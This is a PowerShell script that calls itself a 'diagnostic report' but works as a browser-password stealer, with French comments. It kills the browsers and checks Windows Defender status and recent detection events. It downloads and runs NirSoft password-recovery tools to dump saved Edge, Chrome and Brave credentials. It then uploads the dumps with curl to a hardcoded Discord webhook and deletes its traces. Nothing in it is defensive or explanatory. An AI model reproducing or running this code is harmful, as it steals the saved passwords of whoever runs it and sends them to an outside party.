$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

taskkill /F /IM msedge.exe,chrome.exe,brave.exe 2>$null
Start-Sleep 2

$report = @"
╔════════════════════════════════════════╗
║   DIAGNOSTIC REPORT - $env:COMPUTERNAME
╚════════════════════════════════════════╝
User: $env:USERNAME
Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
PowerShell: $($PSVersionTable.PSVersion)

"@

# ======================================
# TEST 1: Navigateurs installés
# ======================================
$report += "`n[1] BROWSERS INSTALLED`n" + "="*40 + "`n"

$edgeExists = Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$chromeExists = Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$braveExists = Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"

$report += "Edge:   $(if($edgeExists){'✓ INSTALLED'}else{'✗ NOT FOUND'})`n"
$report += "Chrome: $(if($chromeExists){'✓ INSTALLED'}else{'✗ NOT FOUND'})`n"
$report += "Brave:  $(if($braveExists){'✓ INSTALLED'}else{'✗ NOT FOUND'})`n"

# Compter les logins Edge
if ($edgeExists) {
    $edgeSize = (Get-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data").Length
    $report += "`nEdge Login Data size: $([math]::Round($edgeSize/1KB, 2)) KB`n"
}

# ======================================
# TEST 2: Windows Defender
# ======================================
$report += "`n[2] WINDOWS DEFENDER STATUS`n" + "="*40 + "`n"

try {
    $defender = Get-MpPreference -EA 0
    $report += "Real-time Protection: $($defender.DisableRealtimeMonitoring -eq $false)`n"
    $report += "Cloud Protection: $($defender.MAPSReporting -gt 0)`n"
    $report += "Tamper Protection: $(Get-MpComputerStatus | Select -Expand IsTamperProtected)`n"
} catch {
    $report += "Unable to query Defender (access denied or disabled)`n"
}

# ======================================
# TEST 3: Télécharger EdgePassView
# ======================================
$report += "`n[3] EDGEPASSVIEW TEST`n" + "="*40 + "`n"

try {
    $report += "→ Downloading EdgePassView...`n"
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/edgepassview.zip" -OutFile "$env:TEMP\ep_test.zip" -UseBasicParsing -TimeoutSec 15 -EA Stop
    $report += "  ✓ Download successful ($([math]::Round((Get-Item "$env:TEMP\ep_test.zip").Length/1KB, 2)) KB)`n"
    
    $report += "→ Extracting...`n"
    Expand-Archive "$env:TEMP\ep_test.zip" "$env:TEMP\ep_test" -Force -EA Stop
    $report += "  ✓ Extraction successful`n"
    
    $exePath = "$env:TEMP\ep_test\EdgePassView.exe"
    if (Test-Path $exePath) {
        $report += "  ✓ EdgePassView.exe found`n"
        
        $report += "→ Checking file signature...`n"
        $sig = Get-AuthenticodeSignature $exePath -EA 0
        $report += "  Signer: $($sig.SignerCertificate.Subject)`n"
        $report += "  Status: $($sig.Status)`n"
        
        $report += "→ Running EdgePassView...`n"
        
        # Tester avec verbose mode
        $outputFile = "$env:TEMP\ep_output.txt"
        
        # Méthode 1: Mode normal
        & $exePath /stext $outputFile 2>&1 | Out-Null
        Start-Sleep 3
        
        if (Test-Path $outputFile) {
            $size = (Get-Item $outputFile).Length
            $report += "  ✓ Output file created ($size bytes)`n"
            
            if ($size -gt 50) {
                $report += "  ✓ EdgePassView WORKS! (file has content)`n"
                $content = Get-Content $outputFile -Raw
                $report += "`nPreview (first 500 chars):`n"
                $report += $content.Substring(0, [Math]::Min(500, $content.Length)) + "`n"
            } else {
                $report += "  ✗ Output file is empty or too small`n"
                $report += "  Possible cause: No passwords saved in Edge`n"
            }
        } else {
            $report += "  ✗ Output file NOT created`n"
            $report += "  Possible causes:`n"
            $report += "    - Blocked by Windows Defender`n"
            $report += "    - Insufficient permissions`n"
            $report += "    - Tool crashed silently`n"
        }
        
    } else {
        $report += "  ✗ EdgePassView.exe NOT found in ZIP`n"
    }
    
    Remove-Item "$env:TEMP\ep_test.zip","$env:TEMP\ep_test" -Recurse -Force -EA 0
    
} catch {
    $report += "  ✗ ERROR: $($_.Exception.Message)`n"
}

# ======================================
# TEST 4: Télécharger WebBrowserPassView
# ======================================
$report += "`n[4] WEBBROWSERPASSVIEW TEST`n" + "="*40 + "`n"

try {
    $report += "→ Downloading WebBrowserPassView...`n"
    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "$env:TEMP\wb_test.zip" -UseBasicParsing -TimeoutSec 15 -EA Stop
    $report += "  ✓ Download successful ($([math]::Round((Get-Item "$env:TEMP\wb_test.zip").Length/1KB, 2)) KB)`n"
    
    $report += "→ Extracting...`n"
    Expand-Archive "$env:TEMP\wb_test.zip" "$env:TEMP\wb_test" -Force -EA Stop
    $report += "  ✓ Extraction successful`n"
    
    $exePath = "$env:TEMP\wb_test\WebBrowserPassView.exe"
    if (Test-Path $exePath) {
        $report += "  ✓ WebBrowserPassView.exe found`n"
        
        $report += "→ Running WebBrowserPassView...`n"
        
        $outputFile = "$env:TEMP\wb_output.txt"
        & $exePath /stext $outputFile 2>&1 | Out-Null
        Start-Sleep 3
        
        if (Test-Path $outputFile) {
            $size = (Get-Item $outputFile).Length
            $report += "  ✓ Output file created ($size bytes)`n"
            
            if ($size -gt 50) {
                $report += "  ✓ WebBrowserPassView WORKS!`n"
            } else {
                $report += "  ✗ Output file is empty`n"
            }
        } else {
            $report += "  ✗ Output file NOT created`n"
        }
        
    } else {
        $report += "  ✗ WebBrowserPassView.exe NOT found in ZIP`n"
    }
    
    Remove-Item "$env:TEMP\wb_test.zip","$env:TEMP\wb_test" -Recurse -Force -EA 0
    
} catch {
    $report += "  ✗ ERROR: $($_.Exception.Message)`n"
}

# ======================================
# TEST 5: Python disponible?
# ======================================
$report += "`n[5] PYTHON AVAILABILITY`n" + "="*40 + "`n"

$pythonPath = (Get-Command python -EA 0).Source
if ($pythonPath) {
    $pythonVersion = (python --version 2>&1)
    $report += "✓ Python found: $pythonPath`n"
    $report += "  Version: $pythonVersion`n"
    
    # Tester les modules
    $report += "→ Testing pip modules...`n"
    $pipList = pip list 2>&1 | Out-String
    
    if ($pipList -match "pycryptodome") {
        $report += "  ✓ pycryptodome installed`n"
    } else {
        $report += "  ✗ pycryptodome NOT installed`n"
    }
    
    if ($pipList -match "pywin32") {
        $report += "  ✓ pywin32 installed`n"
    } else {
        $report += "  ✗ pywin32 NOT installed`n"
    }
    
} else {
    $report += "✗ Python NOT found`n"
    $report += "  PowerShell method required for decryption`n"
}

# ======================================
# TEST 6: Event Viewer (détection d'antivirus)
# ======================================
$report += "`n[6] RECENT SECURITY EVENTS`n" + "="*40 + "`n"

try {
    $defenderLogs = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=(Get-Date).AddHours(-1)} -MaxEvents 5 -EA 0
    
    if ($defenderLogs) {
        $report += "Recent Defender events:`n"
        foreach ($log in $defenderLogs) {
            $report += "  [$(Get-Date $log.TimeCreated -Format 'HH:mm:ss')] $($log.Message.Split("`n")[0])`n"
        }
    } else {
        $report += "No recent Defender events`n"
    }
} catch {
    $report += "Unable to query event logs`n"
}

# ======================================
# TEST 7: Permissions
# ======================================
$report += "`n[7] USER PERMISSIONS`n" + "="*40 + "`n"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$report += "Administrator: $(if($isAdmin){'✓ YES'}else{'✗ NO (running as user)'})`n"

# ======================================
# CONCLUSION
# ======================================
$report += "`n" + "="*40 + "`n"
$report += "END OF DIAGNOSTIC REPORT`n"
$report += "="*40 + "`n"

# ======================================
# ENVOYER SUR DISCORD
# ======================================

# Diviser en chunks si trop long
$report | Out-File "$env:TEMP\diagnostic.txt" -Encoding UTF8

curl.exe -F "file=@$env:TEMP\diagnostic.txt" -F "content=**🔍 FULL DIAGNOSTIC REPORT - $env:COMPUTERNAME**" $wh 2>$null

# Envoyer aussi les outputs si ils existent
if (Test-Path "$env:TEMP\ep_output.txt") {
    curl.exe -F "file=@$env:TEMP\ep_output.txt" -F "content=**EdgePassView raw output**" $wh 2>$null
}

if (Test-Path "$env:TEMP\wb_output.txt") {
    curl.exe -F "file=@$env:TEMP\wb_output.txt" -F "content=**WebBrowserPassView raw output**" $wh 2>$null
}

# Cleanup
Remove-Item "$env:TEMP\diagnostic.txt","$env:TEMP\ep_output.txt","$env:TEMP\wb_output.txt" -Force -EA 0
